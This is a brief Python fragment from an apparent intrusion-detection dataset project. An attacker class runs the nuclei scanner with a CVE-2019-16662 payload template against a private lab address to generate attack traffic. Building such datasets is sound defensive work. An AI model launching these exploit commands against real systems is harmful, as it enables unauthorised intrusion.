...
class OSCI_CVE_2019_16662_Attacker2(AttackerBase):
    ...
    def main(self):
        ...
        self.commandRunner.runCommand('nuclei -u http://192.168.1.104:30004 -t ~/A-NOVEL-CONTAINER-ATTACKS-DATASET-FOR-INTRUSION-DETECTION_Testing/Scripts/YAMLs/CVE-2019-16662_payload1.yaml')
